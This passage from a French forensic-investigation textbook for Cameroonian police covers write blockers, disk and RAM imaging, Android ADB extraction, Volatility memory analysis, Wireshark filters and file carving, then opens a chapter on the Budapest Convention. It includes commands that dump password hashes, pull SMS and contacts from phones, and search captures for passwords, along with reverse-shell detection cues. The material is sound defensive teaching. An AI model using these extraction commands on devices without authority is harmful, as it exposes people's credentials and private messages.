    Acquisition autonome sans PC \\
Wiebetech Forensic UltraDock & SATA, USB~3.0, NVMe &
    Portable~; adapté aux SSD modernes \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~9.1 --- Write blockers matériels de référence}\end{center}

\subsection{Write blocker logiciel}

En l'absence de write blocker matériel --- situation fréquente dans les
unités PNC camerounaises actuelles --- le write blocker logiciel est une
alternative acceptable si correctement documentée.

\begin{boxoutils}{Write blocker logiciel Windows --- activation registre}
\begin{lstlisting}[language=bash_forensique]
@ Activation
reg add HKLM\SYSTEM\CurrentControlSet\Control\StorageDevicePolicies
    /v WriteProtect /t REG_DWORD /d 1 /f

@ Verification
reg query HKLM\SYSTEM\CurrentControlSet\Control\StorageDevicePolicies
@ Attendu : WriteProtect  REG_DWORD  0x1

@ Test validation (doit echouer)
echo test > D:\test_write.txt
@ Attendu : Acces refuse

@ Desactivation apres acquisition
reg add HKLM\SYSTEM\CurrentControlSet\Control\StorageDevicePolicies
    /v WriteProtect /t REG_DWORD /d 0 /f
\end{lstlisting}
\end{boxoutils}

\begin{boxoutils}{Write blocker logiciel Linux}
\begin{lstlisting}[language=bash_forensique]
# Identifier le disque (ne JAMAIS supposer sdb)
lsblk

# Passer en lecture seule AVANT montage
blockdev --setro /dev/sdb
blockdev --getro /dev/sdb    # Attendu : 1

# Montage en lecture seule (double protection)
mount -o ro,noatime /dev/sdb1 /mnt/evidence

# Test validation (doit echouer)
touch /mnt/evidence/test.txt
# Attendu : Read-only file system
\end{lstlisting}
\end{boxoutils}

\begin{boiteRemarque}{Write blocker logiciel vs matériel}
Le write blocker logiciel est acceptable en investigation préliminaire.
En contexte judiciaire (comparution devant le TCS), le write blocker
matériel est recommandé pour éviter toute contestation. Documenter
obligatoirement~: activation + test de vérification (captures d'écran
horodatées dans le formulaire de custody).
\end{boiteRemarque}

% ============================================================================
\section{Formats d'Image Forensique}
\label{sec:formats-image}
% ============================================================================

\begin{tableaucours}{p{1.8cm}p{2.0cm}p{2.2cm}p{5.5cm}}{%
    \tableauHeader{Format} &
    \tableauHeader{Compression} &
    \tableauHeader{Métadonnées} &
    \tableauHeader{Usage recommandé}
}
\textbf{E01} & Oui (LZX) & Riches &
    \textbf{Standard de référence.} Autopsy, FTK, EnCase.
    Préférer pour toute investigation. \\
\textbf{Ex01} & Oui & Riches + AES &
    E01 chiffré~; données sensibles \\
\textbf{DD / Raw} & Non & Aucune &
    Compatible \emph{tous} outils Linux~; précision absolue~;
    taille = taille disque original \\
\textbf{AFF4} & Oui & Très riches + signature &
    Standard émergent~; signé cryptographiquement \\
\textbf{VMDK / VHD} & Variable & Limitées &
    Machines virtuelles~; Autopsy ouvre directement \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~9.2 --- Formats d'image forensique comparés}\end{center}

\begin{boxdef}
\textbf{Format E01}\index{E01, format}~: format d'Exterro (EnCase). Il
segmente l'image en fichiers configurables (\texttt{.E01}, \texttt{.E02}~\ldots)
et intègre~: hash MD5 et SHA-1 de chaque segment~; métadonnées de l'affaire
(N°~dossier, examinateur, notes)~; vérification d'intégrité automatique
à l'ouverture. C'est le format le plus reconnu devant les tribunaux.
\end{boxdef}

% ============================================================================
\section{FTK Imager~: Acquisition Disque et RAM}
\label{sec:ftk-imager}
% ============================================================================

\subsection{Procédure d'acquisition disque en 7 étapes}

\begin{boxoutils}{FTK Imager --- acquisition disque}
\textbf{Étape~1~:} Activer le write blocker. Vérifier l'espace disponible
sur le support de destination (minimum~: 110\% de la taille source).

\textbf{Étape~2~:} \texttt{File~$\to$ Create Disk Image}. Type de source~:
\begin{itemize}
    \item \textbf{Physical Drive}~: image complète incluant l'espace
          non alloué~; recommandé en investigation forensique.
    \item \textbf{Logical Drive}~: partition uniquement~; plus rapide
          mais peut manquer des artefacts.
\end{itemize}

\textbf{Étape~3~:} Format E01. Options~: segmentation 0 (pas de segmentation)~;
compression~5~; cocher \textit{Verify images after they are created}.

\textbf{Étape~4~:} Métadonnées~:
\begin{lstlisting}[language=bash_forensique]
Case Number    : DOS-2026-034
Evidence Number: EV-001
Unique Description: Dell Inspiron 15 SN-GF8T3Y2 MBONGO
Examiner       : OPJ NKENG Eric - Matricule PNC 4471-B
Notes          : PC allume - RAM capturee prealablement
\end{lstlisting}

\textbf{Étape~5~:} Support de destination \emph{distinct} de la source
(jamais le même disque). Nom sans espaces~:
\texttt{MBONGO\_EV001\_20260315.E01}.

\textbf{Étape~6~:} Lancer. FTK~Imager affiche la progression, les hash
MD5 et SHA-1 en temps réel, et les erreurs de lecture (bad sectors).

\textbf{Étape~7~:} Vérifier que hash source = hash image. Reporter dans
le formulaire de custody. Sceller l'original.
\end{boxoutils}

\begin{boxalert}
\textbf{Erreurs fréquentes~:}
\begin{itemize}
    \item Acquérir sur le même disque~: l'acquisition échoue à mi-chemin.
    \item Oublier les métadonnées~: sans Case Number, pas de valeur probatoire.
    \item Ne pas vérifier les hash~: si source $\neq$ image, recommencer.
    \item Format DD sur 1~To~: 1~To non compressé~; préférer E01
          ($\approx$~50\% compression).
\end{itemize}
\end{boxalert}

\subsection{Acquisition de la mémoire RAM}

La mémoire RAM contient ce qui n'existe nulle part ailleurs~: processus
en cours d'exécution, connexions réseau actives, mots de passe en
mémoire, clés de chiffrement actives. Sa capture requiert que le PC soit
allumé et constitue la \textbf{première action} sur tout système actif
(RFC~3227, rang~2).

\begin{boxoutils}{FTK Imager --- capture mémoire RAM}
\begin{lstlisting}[language=bash_forensique]
# Interface graphique FTK Imager :
# File --> Capture Memory
# Destination : support externe (jamais disque interne)
# Cocher 'Include pagefile' si disponible
# Cliquer Capture Memory

# Resultat : fichier .mem de la taille de la RAM installee
# 16 Go RAM  --> fichier ~16 Go
# 32 Go RAM  --> fichier ~32 Go

# Hash SHA-256 immediatement apres capture :
certutil -hashfile MBONGO_RAM_20260315.mem SHA256
# Reporter dans le formulaire de custody
\end{lstlisting}
\end{boxoutils}

\begin{boiteRemarque}{La RAM modifie la RAM}
La capture de la mémoire modifie légèrement la mémoire~: le processus
FTK~Imager utilise lui-même de la RAM pendant la capture. C'est inévitable
et documenté --- un fait, pas une violation de custody. Documenter dans le
formulaire~: \textit{``Légère modification de la RAM inhérente à l'outil,
conformément à ACPO Principe~2. Capture réalisée avant toute autre action.''}
\end{boiteRemarque}

\subsection{Acquisition Linux avec dd}

Sur Kali Linux ou tout système Linux, l'outil natif \texttt{dd} permet une
acquisition bit-à-bit sans aucun logiciel supplémentaire~:

\begin{lstlisting}[language=bash_forensique,
    caption={Acquisition forensique dd + dcfldd}]
# Identifier le disque (ne jamais supposer sdb)
lsblk -o NAME,SIZE,FSTYPE,MOUNTPOINT

# Hash SHA-256 AVANT acquisition (original)
sha256sum /dev/sdb | tee hash_source_EV001.txt

# Acquisition dd
dd if=/dev/sdb of=/mnt/evidence/EV001.dd
   bs=65536 conv=noerror,sync status=progress
# bs=65536 : blocs 64 Ko (optimal)
# conv=noerror,sync : continue sur erreur, padde zeros

# Alternative dcfldd (hash pendant l'acquisition)
dcfldd if=/dev/sdb of=/mnt/evidence/EV001.dd
   bs=65536 hash=sha256 hashwindow=10M
   hashlog=/mnt/evidence/EV001_hashlog.txt

# Hash SHA-256 APRES (image)
sha256sum /mnt/evidence/EV001.dd | tee hash_image_EV001.txt

# Comparaison (identiques = integrite OK)
diff hash_source_EV001.txt hash_image_EV001.txt
echo "INTEGRITE: $?"    # 0 = OK
\end{lstlisting}

% ============================================================================
\section{Acquisition Mobile~: Android et iOS}
\label{sec:acquisition-mobile}
% ============================================================================

\subsection{Les quatre niveaux d'acquisition mobile}

\begin{tableaucours}{p{2.0cm}p{2.5cm}p{2.5cm}p{5.5cm}}{%
    \tableauHeader{Niveau} &
    \tableauHeader{Technique} &
    \tableauHeader{Données accessibles} &
    \tableauHeader{Conditions}
}
Niveau~1 & Manuelle (écran) & Contacts, SMS, photos visibles &
    Téléphone déverrouillé~; documentation par photo \\
Niveau~2 & Logique (ADB) & Système de fichiers utilisateur &
    Android déverrouillé~; Options développeur activées \\
Niveau~3 & Physique & Mémoire flash complète~; données supprimées &
    Outils spécialisés (Cellebrite, GrayKey) \\
Niveau~4 & Chip-off / JTAG & Extraction directe de la puce &
    Matériel spécialisé~; risque destruction~; dernier recours \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~9.3 --- Niveaux d'acquisition mobile
(NIST~SP~800-101r1)}\end{center}

\subsection{ADB --- Android Debug Bridge}

\termecle{ADB}\index{ADB} (\textit{Android Debug Bridge}) est l'outil
officiel Google pour communiquer avec un téléphone Android. En forensique,
il constitue le niveau~2~: accès au système de fichiers utilisateur sans
modifier les données.

\textbf{Prérequis~:}
\begin{enumerate}
    \item Mode avion activé (obligatoire --- cf. Ch.~\ref{chap:custody}).
    \item Options développeur~: \texttt{Paramètres~$\to$ À propos~$\to$
          Numéro de build~$\to$ appuyer 7~fois.}
    \item Débogage USB activé~: \texttt{Options développeur~$\to$
          Débogage USB~$\to$ Activé.}
    \item Autorisation sur le téléphone lors du premier branchement.
\end{enumerate}

\begin{boxoutils}{ADB --- commandes forensiques essentielles}
\begin{lstlisting}[language=bash_forensique]
# Verifier la connexion
adb devices
# Attendu : R5CR71XXXX   device

# Identifier l'appareil
adb shell getprop ro.product.model       # Modele
adb shell getprop ro.build.version.release  # Android version
adb shell getprop ro.serialno            # Numero de serie

# Extraction du systeme de fichiers utilisateur
adb pull /sdcard/ ./extraction/sdcard/
# /sdcard : photos, videos, telechargements, backups WhatsApp

# Liste des applications installees
adb shell pm list packages -f > ./extraction/applications.txt

# Extraction SMS (selon version Android)
adb shell content query --uri content://sms/
    > ./extraction/sms.txt

# Contacts
adb shell content query --uri content://contacts/people/
    > ./extraction/contacts.txt

# Journal systeme
adb logcat -d > ./extraction/logcat.txt

# Sauvegarde complete
adb backup -all -apk -shared -f backup_evidence.ab

# Hash SHA-256 de l'extraction
find ./extraction/ -type f -exec sha256sum {} \;
    > hash_extraction.txt
\end{lstlisting}
\end{boxoutils}

\begin{boxCRO}
\textbf{Analyse CRO --- Extraction ADB complète vs ciblée}

L'extraction complète (\texttt{adb pull /sdcard/}) capture tout~:
photos personnelles, messages privés, données de santé.

$\mathcal{C}$~: extraction complète = atteinte maximale à la vie privée~;
extraction ciblée = atteinte proportionnée.

$\mathcal{R}$~: extraction complète préférable pour ne pas manquer
des preuves dans des répertoires inattendus.

$\mathcal{O}$~: le principe de proportionnalité (art.~52
\loicam{2010/012}) exige que la saisie soit limitée au pertinent.

\cro{$\downarrow$ tension à gérer}{$\uparrow$ extraction complète}{$\sim$ justification requise}

\textbf{Règle pratique~:} en contexte judiciaire, documenter pourquoi
une extraction complète était nécessaire (impossibilité de cibler~;
risque de preuves dans des répertoires inattendus).
\end{boxCRO}

\subsection{iOS --- contraintes spécifiques}

\begin{itemize}
    \item Chiffrement hardware depuis iOS~8~; pas d'équivalent ADB~;
    \item Extraction logique via iTunes/Finder uniquement avec code PIN~;
    \item Extraction physique~: outils commerciaux (Cellebrite UFED,
          Magnet AXIOM)~;
    \item Données iCloud~: réquisition à Apple
          (\texttt{legalprocess.apple.com}).
\end{itemize}

En l'absence d'outils spécialisés~: conserver éteint ou mode avion,
documenter l'IMEI, transmettre à un laboratoire accrédité.
\textbf{Ne jamais tenter de brute-forcer le code PIN}~: après
10~tentatives échouées, iOS efface les données.

% ============================================================================
\section{Volatility~3~: Analyse de la Mémoire RAM}
\label{sec:volatility}
% ============================================================================

\subsection{Architecture et principe}

\termecle{Volatility~3}\index{Volatility} est le standard mondial d'analyse
forensique de la mémoire RAM. Il analyse le fichier \texttt{.mem} capturé
avec FTK~Imager et révèle l'état du système \emph{au moment de la capture}~:
processus en cours, connexions réseau, mots de passe, clés de chiffrement.

La version~3 (depuis 2021) utilise une syntaxe unifiée sans profil
obligatoire~: le profil Windows est détecté automatiquement.

\begin{boxoutils}{Volatility~3 --- commandes essentielles}
\begin{lstlisting}[language=bash_forensique]
# -- IDENTIFICATION --
python3 vol.py -f memoire.mem windows.info

# -- PROCESSUS --
# Liste complete (PID, PPID, dates)
python3 vol.py -f memoire.mem windows.pslist

# Arborescence parent-enfant
python3 vol.py -f memoire.mem windows.pstree
# Indicateur suspect : svchost.exe enfant de cmd.exe
# (svchost legitime a toujours services.exe comme parent)

# -- RESEAU --
python3 vol.py -f memoire.mem windows.netscan
# Indicateur suspect : connexion ESTABLISHED vers port 4444

# -- COMMANDES EXECUTEES --
python3 vol.py -f memoire.mem windows.cmdline
# Indicateur suspect : PowerShell encodedcommand base64

# -- FICHIERS EN MEMOIRE --
python3 vol.py -f memoire.mem windows.filescan

# Extraire un fichier depuis la memoire
python3 vol.py -f memoire.mem windows.dumpfiles
    --virtaddr 0xXXXXXXXX

# -- HASHES MOTS DE PASSE --
python3 vol.py -f memoire.mem windows.hashdump

# -- CAPTURES D'ECRAN --
python3 vol.py -f memoire.mem windows.screenshotss
    -D ./screenshots/
\end{lstlisting}
\end{boxoutils}

\subsection{Détecter un processus malveillant~: cas MVOM}

\begin{lstlisting}[language=bash_forensique,
    caption={Analyse Volatility --- Opération MVOM TRANSBOIS SA}]
# Etape 1 : processus
python3 vol.py -f transbois.mem windows.pslist
# Resultat SUSPECT :
# 4892  4891  svchost.exe   2026-03-13 02:17:44
# 4891  4888  cmd.exe       2026-03-13 02:17:42
# ANORMAL : svchost ne doit pas avoir cmd comme parent

# Etape 2 : connexions reseau
python3 vol.py -f transbois.mem windows.netscan | grep 4892
# Resultat :
# ESTABLISHED  10.0.0.15:49212  185.220.XX.XX:4444  4892
# Connexion active vers C2 (port 4444)

# Etape 3 : identifier le fichier malveillant
python3 vol.py -f transbois.mem windows.filescan | grep enc_all
# Resultat :
# \Device\...\AppData\Local\Temp\enc_all.ps1
# Preuve de l'installation au moment de la capture
\end{lstlisting}

% ============================================================================
\section{Wireshark~: Analyse du Trafic Réseau}
\label{sec:wireshark}
% ============================================================================

\subsection{Modes d'utilisation forensique}

\termecle{Wireshark}\index{Wireshark} s'utilise en deux modes~:
\begin{enumerate}
    \item \textbf{Analyse de capture fournie}~: ouvrir un fichier
          \texttt{.pcap} / \texttt{.pcapng} collecté sur la scène.
    \item \textbf{Capture live}~: capturer en temps réel (nécessite
          une position dans le réseau~: SPAN port, mirror, hub).
\end{enumerate}

\subsection{Filtres de référence}

\begin{boxoutils}{Wireshark --- filtres forensiques essentiels}
\begin{lstlisting}[language=bash_forensique]
# Tout le trafic d'une IP
ip.addr == 185.220.XX.XX

# Communications entre deux hotes
ip.addr == 10.0.0.15 && ip.addr == 185.220.XX.XX

# HTTP (non chiffre)
http

# Soumissions de formulaires (mots de passe)
http.request.method == "POST"

# Requetes DNS (domaines consultes)
dns

# Port suspect (Metasploit, shells inverses)
tcp.port == 4444

# Trafic email non chiffre
smtp || pop3 || imap

# Recherche textuelle dans les trames
frame contains "password"
frame contains "Authorization"

# FONCTIONS UTILES :
# Statistics --> Conversations : toutes les paires IP
# Statistics --> Protocol Hierarchy : volumes par protocole
# File --> Export Objects --> HTTP : extraire fichiers telecharges
\end{lstlisting}
\end{boxoutils}

\begin{boxscenario}{Wireshark --- cas WOURI BEC}
La capture réseau SOTRADI.pcap est disponible. L'analyste reconstruit
l'attaque~:
\begin{enumerate}
    \item Filtre \texttt{smtp}~$\to$ email entrant depuis
          \texttt{contact@medequip-portugal.com}.
    \item Clic droit~$\to$ \textit{Follow TCP Stream}~: les en-têtes
          SMTP révèlent l'IP source réelle~: serveur russe.
    \item Filtre \texttt{dns}~$\to$ chercher \texttt{medequip-portugal.com}~:
          la résolution confirme l'enregistrement récent (12/01/2026,
          3~jours avant le paiement).
    \item \textit{Statistics~$\to$ Conversations}~: volumes de transfert
          anormaux vers IPs suspectes.
\end{enumerate}

\textbf{Constatation forensique (sans interprétation)~:} ``Le paquet
\#~14~872 (timestamp 2026-01-15~14h28) contient un email SMTP depuis
\texttt{contact@medequip-portugal.com}, originant depuis l'IP
\texttt{91.XXX.XX.XX} selon le champ \texttt{Received}. Le domaine
\texttt{medequip-portugal.com} a été enregistré le 12/01/2026 selon
les bases WHOIS.''
\end{boxscenario}

% ============================================================================
\section{File Carving~: Récupérer les Fichiers Supprimés}
\label{sec:file-carving}
% ============================================================================

\subsection{Principe des magic bytes}

Le \termecle{file carving}\index{file carving} récupère des fichiers
depuis les données brutes d'un disque en cherchant les
\termecle{magic bytes}\index{magic bytes} --- séquences d'octets
caractéristiques de chaque type de fichier --- sans se fier à la table
de fichiers (qui peut être effacée ou corrompue).

\begin{tableaucours}{p{2.5cm}p{3.5cm}p{5.5cm}}{%
    \tableauHeader{Type} &
    \tableauHeader{Magic bytes (hex)} &
    \tableauHeader{Usage forensique}
}
JPEG & \texttt{FF D8 FF E0} &
    Photos~; contient souvent les métadonnées GPS \\
PDF & \texttt{25 50 44 46} &
    Documents (factures, contrats, bons de commande) \\
ZIP / Office & \texttt{50 4B 03 04} &
    .docx, .xlsx, .pptx (format ZIP interne) \\
PNG & \texttt{89 50 4E 47} &
    Images~; captures d'écran \\
EXE / DLL & \texttt{4D 5A} (``MZ'') &
    Exécutables~; malware supprimé \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~9.4 --- Magic bytes des types courants}\end{center}

\begin{lstlisting}[language=bash_forensique,
    caption={File carving avec Foremost et Scalpel}]
# Foremost -- types cibles
foremost -t jpg,pdf,docx,xlsx -i evidence.dd -o /output/carving/

# Resultats
ls /output/carving/
# jpg/  pdf/  docx/  audit.txt

cat /output/carving/audit.txt
# nombre de fichiers, taille totale, positions

# Scalpel -- configuration flexible
scalpel -c /etc/scalpel/scalpel.conf evidence.dd
    -o /output/scalpel/

# Rechercher des strings dans l'espace non alloue
strings -a evidence.dd
    | grep -i "momo\|virement\|password\|iban"
    > strings_suspects.txt
\end{lstlisting}

% ============================================================================
\section{Synthèse~: Choisir ses Outils selon la Situation}
\label{sec:choix-outils}
% ============================================================================

\begin{tableaucours}{p{4.5cm}p{3.5cm}p{4.0cm}}{%
    \tableauHeader{Situation} &
    \tableauHeader{Outil} &
    \tableauHeader{Procédure}
}
PC allumé --- capturer la RAM & FTK~Imager &
    \texttt{File~$\to$~Capture Memory} \\
PC éteint --- image disque (Windows) & FTK~Imager &
    \texttt{File~$\to$~Create Disk Image~$\to$~E01} \\
PC éteint --- image disque (Linux) & \texttt{dd} / \texttt{dcfldd} &
    \texttt{dd if=/dev/sdb of=image.dd bs=65536} \\
Android déverrouillé & ADB &
    \texttt{adb pull /sdcard/} + backup \\
iOS & iTunes & Sauvegarde~; réquisition Apple LEA \\
Analyse RAM & Volatility~3 &
    \texttt{windows.pslist}, \texttt{netscan}, \texttt{filescan} \\
Analyse capture réseau & Wireshark &
    Filtres \texttt{http}, \texttt{smtp}, \texttt{tcp.port} \\
Récupérer fichiers supprimés & Foremost / Autopsy &
    \texttt{foremost -t jpg,pdf} ou Deleted Files \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~9.5 --- Sélection des outils par situation}\end{center}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item \textbf{Write blocker}~: activer AVANT de brancher l'evidence.
          Matériel = gold standard~; logiciel acceptable si documenté
          (activation + test de refus d'écriture).

    \item \textbf{FTK~Imager}~: 7~étapes (write blocker~$\to$ type~$\to$
          format E01~$\to$ métadonnées~$\to$ destination distincte~$\to$
          lancer~$\to$ vérifier hash). RAM~: \texttt{File~$\to$~Capture
          Memory} sur support externe.

    \item \textbf{Format E01}~: standard~; compression~$\approx$~50\%~;
          métadonnées embarquées~; vérification automatique.
          DD~: compatible tous outils mais taille source = taille image.

    \item \textbf{ADB}~: 4 prérequis (mode avion, options développeur,
          débogage USB, autorisation). \texttt{adb pull /sdcard/} +
          backup. Limites~: WhatsApp chiffré sans root. Gérer
          la tension $\mathcal{C}$ vs $\mathcal{R}$ (proportionnalité).

    \item \textbf{Volatility~3}~: trio de base~: \texttt{windows.pslist}
          + \texttt{netscan} + \texttt{filescan}. Indicateurs suspects~:
          \texttt{svchost.exe} enfant de \texttt{cmd.exe}~; connexion
          ESTABLISHED port~4444.

    \item \textbf{Wireshark}~: quatre filtres clés~: \texttt{ip.addr}
          (isoler une IP)~; \texttt{smtp} (emails)~;
          \texttt{http.request.method == "POST"} (formulaires)~;
          \texttt{frame contains "password"}.

    \item \textbf{File carving}~: \texttt{foremost -t jpg,pdf}~;
          magic bytes~; utile quand la table de fichiers est corrompue
          ou délibérément effacée.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~9.1 --- Choix d'outil \niveaubase}]
Pour chacune des situations, indiquez l'outil, la commande exacte et
le format de sortie~:
\begin{enumerate}[(a)]
    \item PC Windows allumé saisi~: capturer la mémoire RAM.
    \item SSD SATA extrait après extinction~: image forensique sous Linux.
    \item Samsung Galaxy A32, Android~11, déverrouillé~: extraire photos
          et liste des applications.
    \item Image DD 500~Go~: récupérer tous les fichiers PDF supprimés.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~9.2 --- Analyse Volatility \niveaumoyen}]
La sortie de \texttt{python3 vol.py -f incident.mem windows.pstree}
donne (extrait)~:
\begin{lstlisting}[language=bash_forensique]
PID   PPID  Name              CreateTime
1024  788   services.exe
  1284 1024  svchost.exe      (7 instances normales)
4892  4888  svchost.exe       2026-03-13 02:17:44
  4888 4884  cmd.exe          2026-03-13 02:17:42
    4884 4880  powershell.exe 2026-03-13 02:17:40
      4880 4876  explorer.exe 2026-03-13 02:17:38
\end{lstlisting}
\begin{enumerate}[(a)]
    \item Identifiez au moins deux anomalies dans cette arborescence.
    \item Formulez une constatation forensique (sans interprétation)
          pour chaque anomalie.
    \item Quelles commandes Volatility lanceriez-vous ensuite~?
          Dans quel ordre et pourquoi~?
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~9.3 --- Pipeline complet \niveauexpert}]
Vous arrivez sur la scène MVOM~: serveur Dell PowerEdge R740,
Windows~Server~2022, allumé, connecté au réseau. Le ransomware était
actif il y a 20~minutes.
\begin{enumerate}[(a)]
    \item Rédigez le protocole d'acquisition complet dans l'ordre~:
          chaque action, outil, commande exacte, justification forensique.
    \item Le serveur a 128~Go de RAM. Quel support~? Durée estimée~?
          Comment documenter la modification inévitable de la RAM~?
    \item Appliquez la grille CRO à la décision d'effectuer une capture
          Wireshark live de 60~minutes avant d'éteindre le serveur.
    \item Rédigez les deux premières entrées du formulaire de custody.
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} La Partie~II est maintenant complète~: PIU
(Ch.~\ref{chap:PIU}), Standards (Ch.~\ref{chap:meth-std}),
Custody (Ch.~\ref{chap:custody}) et ce chapitre constituent
le socle opérationnel de tout ce qui suit.

La \textbf{Partie~III} (Chapitres~10--13) approfondit le cadre normatif~:
normes globales ISO et Budapest, législation mondiale comparative,
droit camerounais et africain, déontologie de l'investigateur. Elle
n'est pas un doublon~: elle donne la \emph{légitimité juridique} qui
confère toute leur valeur aux procédures techniques que vous maîtrisez
maintenant.
\end{boxinfo}

      
    % ======================================================================
    % PARTIE III — CADRE NORMATIF, JUDICIAIRE ET DÉONTOLOGIQUE
    % Standards : Convention de Budapest, Convention de Malabo, Loi 2010/012
    % Niveau : fondamental (avec approfondissements juridiques)
    % ======================================================================
    \part{Cadre Normatif, Judiciaire et Déontologique}
    \label{part:normatif}

        % ============================================================================
% Fichier  : partie3/P03_C10_cadre_normatif_global.tex
% Titre    : Cadre Normatif Global
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% Statut   : RÉDIGÉ
% Sources  : 5_cadre_normatif_global.tex (squelette ISO)
%            M4_Cadre_Normatif_International_PNC.docx (Budapest, Malabo,
%            INTERPOL, AFRIPOL, portails LEA, exercices BAOBAB)
%            Ch. 7 (standards forensiques déjà couverts)
% Positionnement : Ch. 7 = standards du point de vue technique-forensique.
%                  Ce chapitre = cadre normatif du point de vue coopératif
%                  et de la légitimité internationale des investigations.
% ============================================================================

\chapter{Cadre Normatif Global}
\label{chap:norm-glob}

\epigraph{%
    « La loi doit fournir un cadre sans entraver l'innovation,
    protéger sans étouffer, réguler sans paralyser. »%
}{--- Simone Veil}

\niveauChapitre{Fondamental}{%
    Aucun prérequis technique. Ce chapitre est essentiellement juridique
    et procédural. Lecture du Chapitre~\ref{chap:meth-std} (Standards)
    recommandée pour ne pas dupliquer --- les deux se complètent.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Situer la Convention de Budapest dans le paysage du droit
          international du cyber et comprendre sa relation avec la
          législation camerounaise.
    \item Maîtriser les articles fondamentaux de Budapest~: art.~2--11
          (infractions), art.~16--21 (mesures procédurales),
          art.~23--35 (coopération).
    \item Comparer Budapest et Malabo sur cinq critères~: champ d'application,
          infractions, protection des données, coopération, ratifications.
    \item Mobiliser le bon instrument international selon la nature,
          l'urgence et la géographie d'une demande de coopération.
    \item Utiliser les canaux INTERPOL (réseau 24/7) et AFRIPOL
          pour des demandes de coopération urgentes.
    \item Soumettre une demande structurée aux portails LEA des grands
          fournisseurs (Meta, Google, Microsoft).
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Pourquoi un cadre normatif global~?}
% ============================================================================

Le cybercrime n'a pas de frontières. Un ransomware déployé depuis
Saint-Pétersbourg, chiffrant des fichiers à Yaoundé, via un serveur de
commande en Roumanie, est une réalité quotidienne. Sans cadre normatif
commun entre les États, chaque frontière est un mur~: les preuves
disparaissent avant que les demandes d'entraide n'arrivent, les suspects
se réfugient dans des pays sans traités, les fonds blanchis traversent
des juridictions incompatibles.

Ce chapitre répond à une question pratique~: \emph{quand une affaire
dépasse les frontières camerounaises, sur quelle base légale demander
quoi, à qui, par quel canal, dans quel délai~?}

\separateur

% ============================================================================
\section{La Convention de Budapest~: Premier Traité International
sur la Cybercriminalité}
\label{sec:budapest}
% ============================================================================

\subsection{Contexte, portée et position du Cameroun}

Adoptée par le Conseil de l'Europe le 23~novembre~2001 (STE n°~185),
la \termecle{Convention de Budapest}\index{Budapest, Convention de} est
le premier et unique traité international contraignant en matière de
cybercriminalité. En 2026, plus de 68~États la ont ratifiée, dont les
États-Unis, le Japon, l'Australie, le Canada, et sur le continent
africain~: le Cap-Vert, le Ghana, le Maroc, la Mauritanie, le Nigeria,
le Sénégal et la Tunisie.

\begin{boxalert}
\textbf{Position du Cameroun vis-à-vis de Budapest~:}

Le Cameroun \textbf{n'est pas signataire} de la Convention de Budapest
(juin~2026). Ce fait ne le place pas hors du droit international du
cyber pour autant~:
\begin{enumerate}
    \item La \loicam{2010/012} s'est directement inspirée de Budapest~---
          les deux textes sont largement alignés sur les infractions et
          les mesures procédurales.
    \item Les partenaires africains ayant ratifié Budapest (Ghana, Nigeria,
          Sénégal) coopèrent avec le Cameroun via leurs propres obligations.
    \item Le Cameroun peut rejoindre Budapest à tout moment --- la Convention
          est ouverte à tous les États.
\end{enumerate}
\textbf{Posture opérationnelle~:} maîtriser Budapest comme si le Cameroun
en était partie --- parce que les partenaires avec qui les OPJ coopèrent
l'appliquent, et parce que la Loi~2010/012 en est directement issue.
\end{boxalert}

\subsection{Architecture de la Convention}

\begin{tableaucours}{p{4.0cm}p{8.0cm}}{%
    \tableauHeader{Section} &
    \tableauHeader{Contenu essentiel}
}
Chapitre~I --- Définitions (art.~1) &
    Lexique commun~: système informatique, données informatiques,
    fournisseur de services, données de trafic. \\
Chapitre~II Sect.~1 --- Droit pénal (art.~2--13) &
    Infractions que chaque État doit ériger en droit interne. \\
Chapitre~II Sect.~2 --- Procédure (art.~14--22) &
    Pouvoirs d'investigation~: conservation, production,
    perquisition, interception. \\
Chapitre~III --- Coopération (art.~23--35) &
    Mécanismes d'entraide~: extradition, MLAT, réseau 24/7,
    conservation urgente transfrontalière. \textbf{Le cœur opérationnel.} \\
Chapitre~IV --- Dispositions finales (art.~36--48) &
    Signatures, ratifications, réserves. \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~10.1 --- Architecture de la Convention de Budapest}\end{center}

% ============================================================================
\subsection{Les infractions pénales~: articles~2 à~11}
% ============================================================================

Ces articles définissent les infractions que chaque État partie doit
ériger en droit interne. Pour un OPJ camerounais, ils fondent les
demandes de coopération vers les États partenaires.

\begin{boxjuris}
\textbf{Article~2 --- Accès illégal~:}
\begin{quote}
Chaque Partie adopte les mesures législatives \textit{[\ldots]} pour
ériger en infraction pénale \textit{[\ldots]} le fait intentionnel
d'accéder sans droit à tout ou partie d'un système informatique.
\end{quote}
\textbf{Équivalent camerounais~:} \loicam{2010/012}, art.~55.
Formulations quasi-identiques.\\
\textbf{Usage opérationnel~:} art.~2 fonde la demande de coopération
quand le serveur piraté ou l'auteur de l'intrusion est situé dans un
État partie à Budapest.
\end{boxjuris}

\begin{boxjuris}
\textbf{Article~8 --- Fraude informatique~:}
\begin{quote}
\textit{[\ldots]} le fait de causer un préjudice patrimonial à autrui
par toute introduction, altération, effacement ou suppression de données
informatiques \textit{[\ldots]} dans l'intention frauduleuse ou déloyale
d'obtenir sans droit un bénéfice économique.
\end{quote}
\textbf{Équivalent camerounais~:} \loicam{2010/012}, art.~78.
\textbf{L'article le plus utilisé en pratique.}\\
Couvre~: BEC, phishing bancaire, fraude Mobile Money, virement
frauduleux par manipulation. Art.~8 fonde la demande vers le pays de
l'auteur \emph{ET} vers la banque destinataire pour gel des fonds.
\end{boxjuris}

